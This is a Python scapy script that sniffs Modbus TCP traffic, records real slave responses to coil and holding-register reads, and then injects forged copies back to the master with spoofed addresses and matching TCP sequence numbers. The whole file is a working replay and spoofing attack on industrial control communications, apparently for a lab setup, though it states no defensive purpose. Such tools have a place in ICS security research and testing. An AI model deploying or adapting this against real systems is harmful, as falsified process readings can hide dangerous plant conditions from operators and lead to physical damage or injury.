from scapy.all import sniff, IP, TCP, Raw, send
import struct

# Cache to store the real slave's responses
response_cache = {}
payload_saved = None

def extract_modbus_data(packet):
    """ Extracts Transaction ID, Unit ID, Function Code, and Payload from Modbus TCP packets """
    if packet.haslayer(Raw):  # Check if the packet contains raw data
        raw_data = bytes(packet[Raw])  # Extract raw data from the packet
        
        # Check if the raw data is at least 9 bytes (minimum for Modbus TCP header)
        if len(raw_data) >= 9:
            transaction_id = raw_data[:2]  # 2-byte Transaction ID
            unit_id = raw_data[6]  # 1-byte Unit ID
            function_code = raw_data[7]  # 1-byte Function Code
            payload = raw_data[8:]  # Remaining data is the payload

            return transaction_id, unit_id, function_code, payload
    return None, None, None, None  # Return None if the packet is invalid

def packet_callback(packet):
    global payload_saved
    """ Analyzes Modbus packets and stores real responses for future replay """
    
    if packet.haslayer(Raw):  # Check if the packet contains raw data
        transaction_id, unit_id, function_code, payload = extract_modbus_data(packet)
        
        if transaction_id is None:
            return  # Ignore if no valid Modbus data is found
        if function_code != 1 and function_code != 3:
            return  # Only process function codes 1 (Read Coils) and 3 (Read Holding Registers)
        
        # Identifies requests from the Modbus master (client)
        if packet[TCP].dport == 5020:  # Modbus TCP port
            request_key = (unit_id, function_code, payload)  # Create a key from the request's data
            if request_key in response_cache:  # Check if a response is already cached
                print(f"[⚡] Replaying saved response for {request_key}")

                # Retrieve the cached response
                fake_response = bytearray(response_cache[request_key])
                fake_response[:2] = transaction_id  # Replace the Transaction ID to match the original request
                # Construct the Modbus TCP response packet
                ip = IP(dst=packet[IP].src, src=packet[IP].dst)
                tcp = TCP(dport=packet[TCP].sport, sport=5020, seq=packet[TCP].ack, 
                          ack=packet[TCP].seq + len(bytes(packet[Raw])), flags="PA")
                send(ip/tcp/Raw(load=fake_response), verbose=False)  # Send the crafted fake response
                payload_saved = None
                print("[✅] Fake response sent!")
            else:
                payload_saved = payload  # Save the payload for future reference
        # Identifies responses from the Modbus slave (server)
        elif packet[TCP].sport == 5020:  # Modbus TCP port
            if payload_saved is None:
                return  # Ignore if no request was previously saved

            request_key = (unit_id, function_code, payload_saved)
            if request_key not in response_cache:  # If response is not already cached
                response_cache[(unit_id, function_code, payload_saved)] = bytes(packet[Raw])
                print(f"[📡] Recorded real response for Unit ID {unit_id}, function {function_code}, payload {payload_saved}")

# Start network sniffing
print("[🚀] Listening for Modbus TCP traffic...")
sniff(iface="ens37", filter="tcp port 5020", prn=packet_callback)

